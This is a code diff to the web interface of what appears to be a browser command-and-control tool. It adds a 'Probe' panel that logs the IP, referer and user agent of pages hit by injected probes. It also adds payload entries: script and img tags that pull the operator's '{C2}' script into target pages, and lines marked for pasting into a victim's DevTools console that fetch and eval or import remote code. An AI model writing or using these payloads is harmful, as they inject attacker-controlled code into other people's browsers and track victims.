@@ -359,6 +359,19 @@ body{font:11px/1 'Menlo','Monaco','Consolas','Courier New',monospace;
            border-radius:8px;padding:0 5px;font-size:9px;vertical-align:middle;margin-left:4px}
 
 /* ══════════════════════════════════════
+   Probe panel
+══════════════════════════════════════ */
+#ptbl-wrap{flex:1;overflow:auto}
+#ptbl{width:100%;border-collapse:collapse;font-size:11px;table-layout:fixed}
+#ptbl thead th{background:var(--bg2);color:var(--dim);padding:3px 8px;text-align:left;
+  font-weight:normal;border-bottom:1px solid var(--border);position:sticky;top:0;z-index:1;
+  font-size:10px;overflow:hidden;white-space:nowrap}
+#ptbl td{padding:2px 8px;border-bottom:1px solid var(--border);overflow:hidden;
+  text-overflow:ellipsis;white-space:nowrap;vertical-align:top}
+#ptbl tbody tr:hover{background:rgba(0,0,0,.04)}
+#p-empty td{padding:20px;text-align:center;color:var(--faint);font-size:11px}
+
+/* ══════════════════════════════════════
    Payloads panel
 ══════════════════════════════════════ */
 #plpanel-scroll{flex:1;overflow-y:auto;padding:10px 14px}
@@ -417,6 +430,7 @@ body{font:11px/1 'Menlo','Monaco','Consolas','Courier New',monospace;
   <div class="ptab"   data-p="n">Network<span class="bdg"     id="nbdg">0</span></div>
   <div class="ptab"   data-p="h">Sessions<span class="bdg"    id="hbdg"></span></div>
   <div class="ptab"   data-p="pl">Payloads</div>
+  <div class="ptab"   data-p="pb">Probe<span class="bdg" id="pbbdg">0</span></div>
   <div class="ptab"   data-p="s">Settings</div>
   <div id="pright">
     <span class="pill" id="connpill">—</span>
@@ -521,6 +535,25 @@ body{font:11px/1 'Menlo','Monaco','Consolas','Courier New',monospace;
   </div>
   <div id="hpanel-scroll">
     <div id="h-empty">No sessions</div>
+  </div>
+</div>
+
+<!-- Probe panel -->
+<div id="pbpanel" class="panel">
+  <div class="tbar" style="padding:0 10px;gap:8px">
+    <span style="color:var(--dim);font-size:10px">Probe hits — /bx.js · /probe 로드 기록 (Referer = 발생 페이지)</span>
+    <button class="mbtn" id="pbclear" style="margin-left:auto">Clear</button>
+  </div>
+  <div id="ptbl-wrap">
+    <table id="ptbl">
+      <thead><tr>
+        <th style="width:60px">Time</th><th style="width:90px">Tag</th><th style="width:70px">Dest</th>
+        <th style="width:110px">IP</th><th>Referer (발생 페이지)</th><th>UA</th>
+      </tr></thead>
+      <tbody id="ptbody">
+        <tr id="p-empty"><td colspan="6">No probe hits — Payloads 탭의 probe 페이로드를 대상 페이지에 넣어보세요</td></tr>
+      </tbody>
+    </table>
   </div>
 </div>
 
@@ -631,11 +664,12 @@ $("ptabs").addEventListener("click", function(e){
   var p = t.dataset.p; curPanel = p;
   document.querySelectorAll(".ptab").forEach(function(x){ x.classList.toggle("on", x.dataset.p===p); });
   document.querySelectorAll(".panel").forEach(function(x){ x.classList.remove("on"); });
-  $({c:"cpanel",n:"npanel",h:"hpanel",s:"spanel",pl:"plpanel"}[p]).classList.add("on");
+  $({c:"cpanel",n:"npanel",h:"hpanel",s:"spanel",pl:"plpanel",pb:"pbpanel"}[p]).classList.add("on");
   if (p==="n" && active) loadNet();
   if (p==="h") renderSessions();
   if (p==="s") loadSettings();
   if (p==="pl") renderPayloads();
+  if (p==="pb") loadProbes();
 });
 
 /* ═══════════ Utils ═══════════ */
@@ -1365,8 +1399,34 @@ $("pxsendbtn").addEventListener("click",function(){
     .catch(function(err){ $("pxres").textContent="Error: "+err; });
 });
 
+/* ═══════════ Probe panel ═══════════ */
+function loadProbes(){
+  fetch("/api/probes").then(function(r){ return r.json(); }).then(function(rows){
+    probeRows = rows || [];
+    pbdg.textContent = probeRows.length;
+    pbdg.className = "bdg" + (probeRows.length ? " show" : "");
+    if (curPanel !== "pb") return;
+    $("ptbody").innerHTML = probeRows.length
+      ? probeRows.slice().reverse().map(function(r){
+          return '<tr>'
+            +'<td>'+esc(r.t)+'</td>'
+            +'<td>'+esc((r.path||"").split("tag=")[1] || "")+'</td>'
+            +'<td>'+esc(r.dest || "-")+'</td>'
+            +'<td>'+esc(r.ip)+'</td>'
+            +'<td class="url-td" title="'+esc(r.referer||"")+'">'+esc(r.referer || "-")+'</td>'
+            +'<td class="url-td" title="'+esc(r.ua||"")+'">'+esc((r.ua||"").slice(0,42))+'</td>'
+            +'</tr>';
+        }).join("")
+      : '<tr id="p-empty"><td colspan="6">No probe hits — Payloads 탭의 probe 페이로드를 대상 페이지에 넣어보세요</td></tr>';
+  }).catch(function(){});
+}
+$("pbclear").addEventListener("click",function(){
+  fetch("/api/probes/clear",{method:"POST"}).then(function(){ loadProbes(); }).catch(function(){});
+});
+setInterval(function(){ if(curPanel==="pb") loadProbes(); }, 2000);
+
 /* ═══════════ Payloads panel ═══════════ */
-var plFilt = "";
+var probeRows = [], plFilt = "";
 function plC2Base(){
   var v = (localStorage.pl_c2 || "").trim();
   if (!v) return location.origin;
@@ -1384,6 +1444,14 @@ function plParts(){
            B64:btoa(imp), FCC:fcc.join(","), UENC:encodeURIComponent(U) };
 }
 var PAYLOADS = [
+  {sec:"Probe · one-shot — 연결 확인 + 트리거를 한 번에", items:[
+    {n:"one-shot (img + script)", d:"probe hit(연결 확인) 후 곧바로 bx.js 로드", c:'<img src="{C2}/probe?tag=hit"><script src="{C2}"><\/script>'},
+    {n:"one-shot (단일 태그)", d:"bx.js 요청 자체가 Probe 탭에 기록됨 (Referer=발생 페이지)", c:'<script src="{C2}?tag=hit"><\/script>'},
+    {n:"img probe", d:"JS 불필요 — img-src 허용 여부만 확인 (1x1 GIF 응답)", c:'<img src="{C2}/probe?tag=img">'},
+    {n:"script probe", d:"script-src 허용 여부 확인 (세션 생성 없음)", c:'<script src="{C2}/probe.js?tag=script"><\/script>'},
+    {n:"css probe", d:"style-src 허용 여부 확인", c:'<link rel="stylesheet" href="{C2}/probe.css?tag=css">'},
+    {n:"fetch probe", d:"connect-src 확인 (콘솔 붙여넣기용, no-cors)", c:"fetch('{C2}/probe?tag=fetch',{mode:'no-cors'})"},
+  ]},
   {sec:"Console trigger — paste into the victim DevTools console", items:[
     {n:"import (shortest)", d:"module import — bx.js is served with CORS *", c:"import('{C2}')"},
     {n:"fetch + eval", d:"when import()/modules are blocked", c:"fetch('{C2}').then(r=>r.text()).then(t=>(0,eval)(t))"},
